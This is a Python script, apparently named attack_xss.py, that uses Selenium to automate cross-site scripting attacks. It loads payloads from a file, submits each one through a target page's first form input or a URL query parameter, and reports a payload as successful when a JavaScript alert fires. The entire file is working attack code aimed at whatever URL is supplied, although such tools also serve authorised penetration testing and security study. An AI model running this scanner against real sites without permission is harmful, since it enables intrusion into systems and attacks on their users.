from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoAlertPresentException, UnexpectedAlertPresentException
import time
import urllib.parse

def attack_xss_form(url, payloads_file):
    driver = webdriver.Firefox()

    try:
        with open(payloads_file, 'r') as file:
            payloads = file.read().splitlines()

        for payload in payloads:
            # We open a new window for each payload on the list
            driver.execute_script("window.open('about:blank', 'new_window');")
            driver.switch_to.window('new_window')

            
            driver.get(url)# Navigate to the target URL 
            time.sleep(2)  # Wait for page to load

            
            input_field = driver.find_element(By.TAG_NAME, "input")  # We find the input field using By.TAG_NAME

            input_field.clear()
            input_field.send_keys(payload)
            input_field.send_keys(Keys.RETURN)
            time.sleep(2)

            try:
                # We check if the alert is present
                alert = driver.switch_to.alert
                alert_text = alert.text
                alert.dismiss()  # We dismiss the alert
                print(f"[!] Payload successful for {payload}: {alert_text}")
            except NoAlertPresentException:
                print(f"[+] Payload didn't work for {payload}.")

            driver.close()
            driver.switch_to.window(driver.window_handles[0])

    except Exception as e:
        print(f"Error: {e}")

    finally:
        driver.quit()

def attack_xss_parameter(url, payloads_file):
    driver = webdriver.Firefox()

    try:
        
        driver.get(url)
        time.sleep(2)  

        parameter_name = find_parameter(driver)  # Find the parameter name

        if not parameter_name:
            print(" Cant find parameter name on the page.")
            return

        with open(payloads_file, 'r') as file:
            payloads = file.read().splitlines()

        for payload in payloads:
            encoded_payload = urllib.parse.quote(payload)  # We encode the payload to be included in the URL

            injected_url = f"{url}?{parameter_name}={encoded_payload}"  # New URL with the payload encoded

            driver.get(injected_url)  # Open the new URL
            time.sleep(2)

            try:
                # We check if an alert is present
                alert = driver.switch_to.alert
                alert_text = alert.text
                alert.dismiss()
                print(f" Payload successful for {payload}: {alert_text}")
            except NoAlertPresentException:
                print(f" Payload didn't work for {payload} .")

    except Exception as e:
        print(f"Error: {e}")

    finally:
        driver.quit()

def find_parameter(driver):
    try:
        form_element = driver.find_element(By.TAG_NAME, 'form')  # We Find the first form element on the page

        input_elements = form_element.find_elements(By.TAG_NAME, 'input')  # We find the first input element within the form

        if not input_elements:
            print(" No input element found within the form.")
            return None

        # We are looking for a 'name' attribute
        for input_element in input_elements:
            parameter_name = input_element.get_attribute('name')
            if parameter_name:
                return parameter_name

        print(" No input element with a 'name' attribute found in the form.")
        return None

    except Exception as e:
        print(f"Error: {e}")
        return None

if __name__ == "__main__":
    import sys

    if len(sys.argv) != 4:
        print("Parameter: attack_xss.py <target_url> <payloads_file> <attack_type> '1' for form and '2' for url parameter")
        sys.exit(1)

    target_url = sys.argv[1]
    payloads_file = sys.argv[2]
    attack_type = sys.argv[3]

    if attack_type == '1':
        attack_xss_form(target_url, payloads_file)
    elif attack_type == '2':
        attack_xss_parameter(target_url, payloads_file)
    else:
        print("Invalid attack type. Use '1' or '2'.")
